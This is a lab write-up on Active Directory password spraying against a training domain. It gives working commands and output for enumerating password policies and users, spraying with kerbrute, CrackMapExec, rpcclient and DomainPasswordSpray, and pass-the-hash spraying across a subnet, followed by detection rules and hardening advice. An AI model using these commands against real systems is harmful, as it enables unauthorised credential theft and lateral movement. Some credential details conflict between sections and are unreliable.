# 03 — Password Spraying

> **Environment:** INLANEFREIGHT.LOCAL | DC: `172.16.5.5` | Attack host: Pwnbox (`ens224`)  
> **Objective:** Enumerate valid domain accounts, extract the password policy, and perform controlled password spraying to obtain domain credentials without triggering account lockout.  
> **MITRE ATT&CK:** T1110.003 — Password Spraying

---

## Table of Contents

1. [Root Cause](#root-cause)
2. [Attack Chain Overview](#attack-chain-overview)
3. [Lab Environment](#lab-environment)
4. [Phase 1 — Password Policy Enumeration (Linux)](#phase-1--password-policy-enumeration-linux)
5. [Phase 2 — Valid User Enumeration](#phase-2--valid-user-enumeration)
6. [Phase 3 — Password Spraying from Linux](#phase-3--password-spraying-from-linux)
7. [Phase 4 — Password Spraying from Windows](#phase-4--password-spraying-from-windows)
8. [Phase 5 — Local Administrator Spraying](#phase-5--local-administrator-spraying)
9. [Post-Spray Validation](#post-spray-validation)
10. [Detection Engineering](#detection-engineering)
11. [Defensive Hardening](#defensive-hardening)
12. [References](#references)

---

## Root Cause

Password spraying exploits the intersection of two organisational realities: users tend to choose predictable passwords (seasonal, company-name-based, or policy-minimum-compliant), and organisations rarely implement MFA for internal services uniformly.

The underlying failure is **weak password hygiene at scale**. A single password guess attempted against hundreds or thousands of accounts has a statistical probability of success proportional to the percentage of users following predictable patterns. The attacker trades specificity for breadth — instead of hammering one account with many passwords (brute force, high lockout risk), they attempt one password against many accounts.

**Why this is dangerous in AD environments:**

- Domain credentials grant access to Kerberos, SMB shares, RDP, VPN, OWA, and internal web apps simultaneously
- A single valid credential enables deeper enumeration (BloodHound, PowerView, CME) and lateral movement
- Password spraying via Kerberos Pre-Authentication (`kerbrute`) does not generate Event ID 4625 — the most commonly monitored lockout indicator
- Once credentials are obtained, attackers pivot to Kerberoasting, AS-REP roasting, ACL abuse, and lateral movement

**Lockout Risk — The Critical Constraint:**

The password policy must be extracted before any spray is attempted. Spraying without knowing the lockout threshold will lock out domain accounts and trigger incident response.

```
Policy Variable           Safe Spray Behaviour
─────────────────────     ────────────────────────────────────────────────────
Account Lockout           Number of allowed spray rounds = Threshold - 1
Threshold: 5              (spray 4 times maximum per observation window)

Reset Counter:            Wait > 30 minutes between spray rounds to reset
30 minutes                the bad password counter on all accounts

Minimum Password          Candidate passwords must meet complexity criteria
Length: 8                 (uppercase + lowercase + digit or symbol)
```

---

## Attack Chain Overview

```
  INLANEFREIGHT.LOCAL Environment
  ┌───────────────────────────────────────────────────────────────────────────┐
  │                                                                           │
  │   STEP 1: Extract Password Policy                                        │
  │   ──────────────────────────────                                         │
  │   CME --pass-pol  →  Lockout threshold: 5 / Reset window: 30 min       │
  │                                                                           │
  │   STEP 2: Enumerate Valid Users                                          │
  │   ─────────────────────────────                                          │
  │   kerbrute userenum  →  56 valid accounts in jsmith.txt confirmed       │
  │   CME --users  →  Full domain user list (with credentials)              │
  │                                                                           │
  │   STEP 3: Craft Spray Candidates                                        │
  │   ──────────────────────────────                                         │
  │   Round 1: Welcome1   (wait 30+ min)                                    │
  │   Round 2: Passw0rd   (wait 30+ min)                                    │
  │   Round 3: Winter2022 (wait 30+ min)                                    │
  │                                                                           │
  │   STEP 4: Execute Spray                                                  │
  │   ─────────────────────                                                  │
  │   rpcclient loop  →  Authority Name response = valid credential         │
  │   kerbrute spray  →  [+] VALID LOGIN avazquez:Password123              │
  │   CME spray       →  [+] INLANEFREIGHT.LOCAL\avazquez:Password123      │
  │                                                                           │
  │   STEP 5: Validate & Pivot                                               │
  │   ──────────────────────────                                             │
  │   CME validate  →  [+] credential confirmed                             │
  │   BloodHound / PowerView / Kerberoasting  →  next phase                │
  │                                                                           │
  └───────────────────────────────────────────────────────────────────────────┘
```

---

## Lab Environment

| Component             | Value                                     |
|-----------------------|-------------------------------------------|
| Domain                | `INLANEFREIGHT.LOCAL`                     |
| Domain Controller     | `172.16.5.5` (ACADEMY-EA-DC01)           |
| Attack Host           | Pwnbox — `ens224` interface               |
| Test Credential       | `htb-student:Academy_student_AD!`         |
| Spray Credential      | `avazquez:Password123`                    |
| Windows Spray Result  | `sgage:Welcome1`, `tjohnson:Welcome1`     |

---

## Phase 1 — Password Policy Enumeration (Linux)

Before executing a single spray attempt, extract the domain password policy. This is non-negotiable. Skipping this step risks locking out hundreds of accounts.

### Method 1A — CrackMapExec with Valid Credentials (Most Reliable)

```bash
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

```
SMB         172.16.5.5      445    ACADEMY-EA-DC01 [*] Windows 10.0 Build
17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL)
(signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01 [+]
INLANEFREIGHT.LOCAL\avazquez:Password123
SMB         172.16.5.5      445    ACADEMY-EA-DC01 [+] Dumping password
info for domain: INLANEFREIGHT
SMB         172.16.5.5      445    ACADEMY-EA-DC01 Minimum password
length: 8
SMB         172.16.5.5      445    ACADEMY-EA-DC01 Password history
length: 24
SMB         172.16.5.5      445    ACADEMY-EA-DC01 Maximum password age:
Not Set
SMB         172.16.5.5      445    ACADEMY-EA-DC01 Password Complexity
Flags: 000001
SMB         172.16.5.5      445    ACADEMY-EA-DC01     Domain Password
Complex: 1
SMB         172.16.5.5      445    ACADEMY-EA-DC01 Minimum password age:
1 day 4 minutes
SMB         172.16.5.5      445    ACADEMY-EA-DC01 Reset Account Lockout
Counter: 30 minutes
SMB         172.16.5.5      445    ACADEMY-EA-DC01 Locked Account
Duration: 30 minutes
SMB         172.16.5.5      445    ACADEMY-EA-DC01 Account Lockout
Threshold: 5
SMB         172.16.5.5      445    ACADEMY-EA-DC01 Forced Log off Time:
Not Set
```

**Analysis:**

The policy output confirms the most critical variables for safe spraying:

- **Minimum password length: 8** — spray candidates must be 8+ characters
- **Complexity Flags: 1** — complexity is enforced (upper + lower + digit/symbol)
- **Account Lockout Threshold: 5** — accounts lock after 5 failed attempts
- **Reset Account Lockout Counter: 30 minutes** — bad password counter resets after 30 min
- **Password history length: 24** — 24 passwords remembered; users cannot cycle easily

**Safe spray plan:** Maximum 4 attempts per account per 30-minute observation window. Wait at least 30 minutes (preferably more) between spray rounds.

### Method 1B — rpcclient (NULL Session, No Credentials Required)

This technique works when the DC is configured for SMB NULL sessions — a legacy misconfiguration common on upgraded DCs.

```bash
Hackerpatel007_1@htb[/htb]$ rpcclient -U "" -N 172.16.5.5
```

```
rpcclient $>
```

```
rpcclient $> querydominfo
```

```
Domain:         INLANEFREIGHT
Server:         0x0
Comment:
Total Users:    3650
Total Groups:   0
Total Aliases:  37
Sequence No:    1
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
```

```
rpcclient $> getdompwinfo
```

```
min_password_length: 8
password_properties: 0x00000001
        DOMAIN_PASSWORD_COMPLEX
```

**Analysis:** `getdompwinfo` returns minimum length and the complexity flag. `querydominfo` returns the total user count. No credentials required when NULL sessions are permitted.

### Method 1C — enum4linux (Comprehensive NULL Session Enumeration)

```bash
Hackerpatel007_1@htb[/htb]$ enum4linux -P 172.16.5.5
```

```
|    Password Policy Information for 172.16.5.5    |

[+] Minimum password length: 8
[+] Domain Password Lockout Admins: 0
[+] Minimum password age: 1 day 4 minutes
[+] Reset Account Lockout Counter: 30 minutes
[+] Account Lockout Threshold: 5
[+] Retrieved partial password policy with rpcclient:

Minimum Password Length: 8
```

**Analysis:** `enum4linux` wraps `rpcclient`, `nmblookup`, and `net` into a single enumeration run. The `-P` flag isolates password policy output. This is a quick way to get policy data without manually issuing rpcclient sub-commands.

### Method 1D — enum4linux-ng (Python Rewrite with JSON Output)

```bash
Hackerpatel007_1@htb[/htb]$ enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

```
ENUM4LINUX - next generation

<SNIP>

domain_lockout_information:
    lockout_observation_window: 30 minutes
    lockout_duration: 30 minutes
    lockout_threshold: 5
```

**Analysis:** `enum4linux-ng` outputs results in JSON and YAML in addition to stdout (via `-oA`), making it easy to pipe into reports or parse programmatically. The machine-readable output is valuable during large engagements.

**Extracted Policy Summary:**

| Parameter                  | Value        | Spray Implication                            |
|----------------------------|--------------|----------------------------------------------|
| Minimum password length    | 8            | Candidates must be ≥8 characters            |
| Complexity required        | Yes          | Upper + lower + digit or symbol required    |
| Account lockout threshold  | 5            | Maximum 4 attempts before lockout risk       |
| Lockout observation window | 30 minutes   | Wait >30 min between spray rounds            |
| Lockout duration           | 30 minutes   | Locked accounts auto-unlock after 30 min     |
| Password history           | 24           | Users unlikely to reuse recent passwords     |

---

## Phase 2 — Valid User Enumeration

Spraying against invalid usernames wastes attempts and potentially flags on monitoring systems. Build an accurate user list before spraying.

### Method 2A — Kerbrute User Enumeration (Stealthier — No 4625 Events)

Kerbrute uses Kerberos Pre-Authentication requests to validate usernames. Invalid accounts receive a `PRINCIPAL UNKNOWN` error. Valid accounts receive a Pre-Authentication challenge. This generates **Event ID 4768** (TGT requested), not 4625 (failed logon).

```bash
Hackerpatel007_1@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

```
    __             __
   / /_____  _____/ /_  ______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/   /_.___/_/    \__,_/\__/\___/

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:16:11 >  Using KDC(s):
2022/02/17 22:16:11 >  172.16.5.5:88

2022/02/17 22:16:11 >  [+] VALID USERNAME:  [email protected]
2022/02/17 22:16:11 >  [+] VALID USERNAME:  [email protected]
2022/02/17 22:16:11 >  [+] VALID USERNAME:  [email protected]
2022/02/17 22:16:11 >  [+] VALID USERNAME:  [email protected]
2022/02/17 22:16:11 >  [+] VALID USERNAME:  [email protected]
2022/02/17 22:16:11 >  [+] VALID USERNAME:  [email protected]
2022/02/17 22:16:11 >  [+] VALID USERNAME:  [email protected]
2022/02/17 22:16:11 >  [+] VALID USERNAME:  [email protected]
2022/02/17 22:16:11 >  [+] VALID USERNAME:  [email protected]

<SNIP>

Done! Tested 48705 logins (56 valid) in 9.940 seconds
```

**Analysis:**

56 valid usernames discovered from a 48,705-entry wordlist in under 10 seconds. The `jsmith.txt` list uses the common AD username format of `flast` (first initial + last name), which statistically matches a high percentage of corporate username schemas.

Kerbrute's Kerberos-based approach is significantly stealthier than attempting LDAP or SMB authentication — it does not trigger the 4625 event (failed logon) that most SIEMs are tuned to alert on. It does, however, generate **4768** events (Kerberos TGT requests), which defenders can monitor for a sudden spike in volume from a single source IP.

**Flag breakdown:**
- `-d inlanefreight.local` — target domain for Kerberos realm
- `--dc 172.16.5.5` — explicit KDC address (avoids relying on DNS)
- `/opt/jsmith.txt` — input wordlist in `flast` username format

### Method 2B — CrackMapExec with Valid Credentials (Complete User List)

```bash
Hackerpatel007_1@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

```
SMB         172.16.5.5      445    ACADEMY-EA-DC01 [*] Windows 10.0 Build
17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL)
(signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01 [+]
INLANEFREIGHT.LOCAL\htb-student:Academy_student_AD!
SMB         172.16.5.5      445    ACADEMY-EA-DC01 [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01
INLANEFREIGHT.LOCAL\administrator  badpwdcount: 1 baddpwdtime: 2022-02-23 21:43:35.059620
SMB         172.16.5.5      445    ACADEMY-EA-DC01
INLANEFREIGHT.LOCAL\guest          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01
INLANEFREIGHT.LOCAL\lab_adm        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064

<SNIP>
```

**Analysis:**

CME with the `--users` flag queries LDAP via an authenticated SMB session and returns a full domain user enumeration including `badpwdcount` and `baddpwdtime`. This is crucial intelligence for spraying: **any user with `badpwdcount: 4` must be excluded from the spray** to avoid triggering lockout on that account. The `baddpwdtime` field shows when the last bad password was recorded, helping calculate whether the lockout counter has reset.

Before spraying, parse this output and exclude accounts with badpwdcount ≥ (threshold - 1) = ≥ 4.

---

## Phase 3 — Password Spraying from Linux

With a valid user list (`valid_users.txt`) and the password policy confirmed, execute the spray.

### Spray Candidate Strategy

Based on the policy (complexity required, 8-char minimum), candidate passwords for INLANEFREIGHT.LOCAL:

| Round | Password  | Rationale                                         | Wait After |
|-------|-----------|---------------------------------------------------|------------|
| 1     | Welcome1  | Most common onboarding default in Windows shops   | 30+ min    |
| 2     | Password123 | Still ubiquitous, complexity-compliant          | 30+ min    |
| 3     | Passw0rd  | Classic complexity bypass                         | 30+ min    |
| 4     | Winter2022 | Seasonal + year pattern — common at year-start   | —          |

**Always spray a maximum of one password per 30-minute observation window.** The lockout threshold is 5; keep cumulative attempts at 4 or below.

### Method 3A — rpcclient Bash Loop

```bash
Hackerpatel007_1@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

```
Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

**Analysis:**

This one-liner iterates through every username in `valid_users.txt`, attempts an rpcclient authentication with the candidate password, and runs `getusername` to test whether the session opened successfully. The key is in the response: a **successful authentication** returns `Authority Name: INLANEFREIGHT`. A failed authentication returns nothing (or an error that grep filters out).

This is effective for internal testing but is not stealthy — rpcclient uses NTLMSSP authentication over SMB port 445, which generates **4625** events for failed attempts and **4624 Type 3** events for successful ones. It is also slower than Kerberos-based tools.

**Command breakdown:**
- `for u in $(cat valid_users.txt)` — iterate over each username
- `rpcclient -U "$u%Welcome1"` — authenticate with format `user%password`
- `-c "getusername;quit"` — run command and immediately exit session
- `grep Authority` — filter: successful auth produces `Authority Name` in output

### Method 3B — Kerbrute Password Spray (Stealthier)

```bash
Hackerpatel007_1@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

```
    __             __
   / /_____  _____/ /_  ______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/   /_.___/_/    \__,_/\__/\___/

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:    [email protected]:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
```

**Analysis:**

Kerbrute tested 57 accounts in 0.172 seconds and found one valid credential: `avazquez:Welcome1`. Kerbrute's spray mode works by attempting AS-REQ (Kerberos Pre-Authentication) with the candidate password. If the KDC returns a valid TGT, the credential is correct.

**Critical distinction from brute force:** This generated **57 Event ID 4768** entries (TGT requests), **not 4625 entries** (failed logons). Most SOC teams are tuned to alert on 4625 spikes. A sudden burst of 4768 events from a single IP is less commonly alerted on, though a mature SOC with Kerberos event monitoring will catch it.

**Flag breakdown:**
- `passwordspray` — spray mode (one password, many users)
- `-d inlanefreight.local` — Kerberos realm / domain
- `--dc 172.16.5.5` — explicit KDC
- `valid_users.txt` — user list (one per line, username only)
- `Welcome1` — candidate password (positional argument)

### Method 3C — CrackMapExec Spray with Output Filtering

```bash
Hackerpatel007_1@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

```
SMB         172.16.5.5      445    ACADEMY-EA-DC01 [+]
INLANEFREIGHT.LOCAL\avazquez:Password123
```

**Analysis:**

CME's spray mode accepts a user list file for `-u`. Piping output through `grep +` isolates successful authentications from the noise of failed attempts (CME marks successes with `[+]` and failures with `[-]`). This gives a clean, minimal output showing only the wins.

One hit: `avazquez:Password123`. Note that the rpcclient loop earlier found different accounts (`sgage`, `tjohnson`) with `Welcome1` — this confirms that multiple accounts share the same weak password. In a real engagement, every discovered credential expands the attack surface.

**Flag breakdown:**
- `smb 172.16.5.5` — target DC over SMB (port 445)
- `-u valid_users.txt` — user list (CME accepts files for both `-u` and `-p`)
- `-p Password123` — single candidate password
- `| grep +` — filter output to show only successful authentications

---

## Phase 4 — Password Spraying from Windows

From a domain-joined Windows foothold, `DomainPasswordSpray.ps1` is the go-to tool. It automatically builds the user list from AD, queries the password policy, and respects lockout thresholds.

### Setup and Execution

```powershell
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

```
[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to 30 minutes.
[*] Setting a 30 minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes [N] No [?] Help (default is "Y"): Y

[*] Password spraying has begun with 1 passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1
[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

**Analysis:**

`DomainPasswordSpray.ps1` performed a fully automated spray across 2923 domain accounts and found 2 successful authentications: `sgage:Welcome1` and `tjohnson:Welcome1`.

Key behaviours of this tool that make it professional-grade for authorised testing:

1. **Automatic policy detection** — queries the domain password policy and Fine-Grained Password Policies (FGPPs) before spraying
2. **Lockout protection** — automatically removes any user within 1 attempt of lockout from the spray list
3. **Automatic user list** — builds the target list from AD without requiring a separate enumeration step
4. **Wait enforcement** — sets a 30-minute wait between spray rounds based on the observation window

The `-ErrorAction SilentlyContinue` flag suppresses non-critical PowerShell errors (such as access-denied responses) that would clutter the terminal output.

**Flag breakdown:**
- `Import-Module .\DomainPasswordSpray.ps1` — load the module from current directory
- `-Password Welcome1` — single candidate password for this round
- `-OutFile spray_success` — write successful credentials to file
- `-ErrorAction SilentlyContinue` — suppress PowerShell error messages

---

## Phase 5 — Local Administrator Spraying

Password spraying is not limited to domain accounts. If a local administrator NT hash is obtained from one machine (via SAM dump, LSASS, etc.), it can be sprayed across the entire subnet to identify machines sharing the same local administrator password — a common misconfiguration in environments without LAPS.

```bash
Hackerpatel007_1@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

```
SMB         172.16.5.50     445    ACADEMY-EA-MX01   [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01   [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0   [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

**Analysis:**

Three machines in the `/23` subnet share the same local administrator NT hash: `MX01` (likely Exchange), `MS01`, and `WEB0`. The `(Pwn3d!)` marker indicates that CME was able to authenticate to SMB and confirm local admin rights — full remote code execution via PSExec, smbexec, or wmiexec is possible on all three hosts.

**Critical flag: `--local-auth`**

This flag is non-negotiable. Without it, CME attempts domain authentication and will spray the **domain** administrator account across all targets — causing lockouts. `--local-auth` restricts authentication scope to local accounts only and also limits CME to one attempt per machine, preventing lockout.

**When to use this:**
- After obtaining a local admin hash via SAM dump or secretsdump
- When LAPS is not deployed (no LAPS = reused local admin passwords at scale)
- As a quick lateral movement amplifier during internal assessments

---

## Post-Spray Validation

After a successful spray, validate the credentials before attempting further exploitation:

```bash
Hackerpatel007_1@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

```
SMB         172.16.5.5      445    ACADEMY-EA-DC01 [*] Windows 10.0 Build
17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL)
(signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01 [+]
INLANEFREIGHT.LOCAL\avazquez:Password123
```

**Analysis:** `[+]` confirms the credential is valid against the DC. The absence of `(Pwn3d!)` means `avazquez` is a standard domain user, not a local/domain admin. This is expected — spray rarely yields admin accounts directly. The value is in obtaining valid domain credentials for deeper enumeration.

**Immediate next steps with a valid credential:**

| Technique               | Tool                             | Purpose                              |
|-------------------------|----------------------------------|--------------------------------------|
| Domain enumeration      | BloodHound (`bloodhound-python`) | Map attack paths to DA               |
| User/group enum         | PowerView, CME `--groups`        | Identify privileged accounts         |
| Kerberoasting           | `GetUserSPNs.py`                 | Extract service account TGS hashes   |
| AS-REP roasting         | `GetNPUsers.py`                  | Find accounts with pre-auth disabled |
| ACL enumeration         | BloodHound, PowerView            | Find writable/modifiable ACEs        |
| Credential in shares    | CME `--shares`, `spider_plus`    | Search for cleartext credentials     |

---

## Detection Engineering

Password spraying generates a characteristic pattern in domain event logs. The key is that the attack is spread across many accounts, not concentrated on one — standard brute force detection (threshold per account) will miss it.

### Windows Event IDs

| Event ID | Source         | Trigger                                       | Spray Indicator                                      |
|----------|----------------|-----------------------------------------------|------------------------------------------------------|
| **4625** | Security       | Failed logon (wrong password)                 | Same source IP, many different accounts in short window |
| **4624** | Security       | Successful logon (Type 3 = network)           | Unexpected successful auth after a string of 4625s   |
| **4648** | Security       | Logon attempt using explicit credentials      | Automated tools, PSExec, CME with explicit creds     |
| **4768** | Security (DC)  | Kerberos TGT request                          | Burst from single IP — Kerbrute spray               |
| **4771** | Security (DC)  | Kerberos Pre-Auth failed                      | Kerbrute invalid password attempts                   |
| **4776** | Security (DC)  | NTLM credential validation attempt            | rpcclient/CME spray — many accounts, single IP       |

### Detection Patterns

**SIEM Rule — Horizontal Password Spray Detection:**
```
Alert condition:
  Source_IP: single IP
  Event_ID: 4625 OR 4776
  Distinct_Target_Accounts: > 10
  Timeframe: within 5 minutes
  Action: Alert "Potential Password Spray — Horizontal Account Attack"
```

**SIEM Rule — Kerbrute Spray Detection:**
```
Alert condition:
  Source_IP: single IP
  Event_ID: 4768
  Count: > 20 within 60 seconds
  Action: Alert "Potential Kerbrute Enumeration or Spray"
```

**Key distinction:** Standard brute force rules alert when a **single account** receives many failed logins. Spray rules must alert when a **single source IP** produces failed logins against many different accounts — the inversion of the standard pattern.

### Sysmon

| Event ID | Description                     | Spray Relevance                                      |
|----------|---------------------------------|------------------------------------------------------|
| **3**    | Network connection               | CME / rpcclient outbound SMB (port 445) connections  |

Correlate Sysmon ID 3 (network connection to port 445) with a burst of 4625 events from the same host to identify the spraying machine on the network.

---

## Defensive Hardening

| Control                            | Implementation                                                                 |
|------------------------------------|--------------------------------------------------------------------------------|
| **Multi-Factor Authentication**    | Enforce MFA on all external portals (OWA, VPN, RDP Gateway, cloud apps)        |
| **Fine-Grained Password Policy**   | Apply stricter policies (longer passwords, lower threshold) to privileged OUs  |
| **LAPS Deployment**                | Deploy Microsoft LAPS to randomise local admin passwords per machine            |
| **Azure AD Smart Lockout**         | Enable for hybrid environments — detects and blocks spray patterns             |
| **Password Filter**                | Block company name, months, seasons, common patterns at the domain level        |
| **Privileged Account Separation**  | Admins use separate accounts; compromise of a user account != admin access     |
| **Account Monitoring**             | Alert on badpwdcount increments across many accounts in a short window         |
| **Disable SMB NULL Sessions**      | Set `RestrictAnonymous = 2` to prevent unauthenticated policy enumeration       |
| **Network Segmentation**           | Restrict which machines can reach port 445 on the DC                          |
| **User Education**                 | Passphrases over complexity requirements — length beats predictable complexity  |

**GPO: Disable SMB NULL Session enumeration**

```
Computer Configuration → Windows Settings → Security Settings →
Local Policies → Security Options →
  Network access: Do not allow anonymous enumeration of SAM accounts → Enabled
  Network access: Do not allow anonymous enumeration of SAM accounts and shares → Enabled
```

---

## References

- MITRE ATT&CK T1110.003 — Password Spraying: https://attack.mitre.org/techniques/T1110/003/
- HTB Academy — Active Directory Enumeration & Attacks
- CrackMapExec Documentation: https://github.com/byt3bl33d3r/CrackMapExec
- Kerbrute: https://github.com/ropnop/kerbrute
- DomainPasswordSpray: https://github.com/dafthack/DomainPasswordSpray
- Microsoft LAPS: https://www.microsoft.com/en-us/download/details.aspx?id=46899
- enum4linux-ng: https://github.com/cddmp/enum4linux-ng
- statistically-likely-usernames: https://github.com/insidetrust/statistically-likely-usernames
